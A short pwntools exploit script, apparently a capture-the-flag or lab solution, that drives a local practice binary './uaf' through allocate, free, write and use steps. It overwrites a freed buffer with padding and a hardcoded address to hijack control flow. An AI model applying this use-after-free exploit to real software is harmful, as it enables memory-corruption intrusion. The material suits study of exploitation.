from pwn import *

context.log_level = "DEBUG"
p = process(["./aslrbp", "./uaf"])

p.sendlineafter(b">", b"1")
p.sendlineafter(b"enter initial data (up to 32 bytes, will be zero-padded):", b"lol")
p.sendlineafter(b">", b"2")

p.sendlineafter(b">", b"3")
p.sendlineafter(b"write 40 bytes into buffer:", b"A"*32 + p64(0x100000750))
p.sendlineafter(b">", b"4")


p.interactive()

